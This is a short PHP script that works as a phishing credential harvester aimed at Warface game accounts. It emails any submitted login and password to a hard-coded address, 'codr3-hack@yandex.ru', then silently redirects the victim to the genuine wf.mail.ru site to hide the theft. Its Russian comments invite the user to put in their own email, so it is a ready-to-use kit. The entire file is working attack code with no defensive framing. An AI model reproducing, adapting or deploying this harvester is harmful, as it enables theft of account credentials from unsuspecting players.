<?
echo '<meta charset="utf-8">';
if((isset($_POST['login'])&&$_POST['login']!="")&&(isset($_POST['pass'])&&$_POST['pass']!="")){
        $to = 'codr3-hack@yandex.ru'; //Тут ваша почта!
        $subject = 'Warface АккаунтыF'; //Загаловок сообщения
        $message = '
                <html>
                    <head>
                    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
                        <title>'.$subject.'</title>
                    </head>
                    <body>
                        <p>Login: '.$_POST['login'].'</p>
                        <p>Pass: '.$_POST['pass'].'</p>                        
                    </body>
                </html>'; //Текст нащего сообщения можно использовать HTML теги
        $headers  = "Content-type: text/html; charset=utf-8 \r\n";
        $headers .= "From: Отправитель <from@example.com>\r\n"; //Наименование и почта отправителя
        mail($to, $subject, $message, $headers); 
}
echo "<html><head><META HTTP-EQUIV='Refresh' content ='0; URL=https://wf.mail.ru/'></head></html>";
?>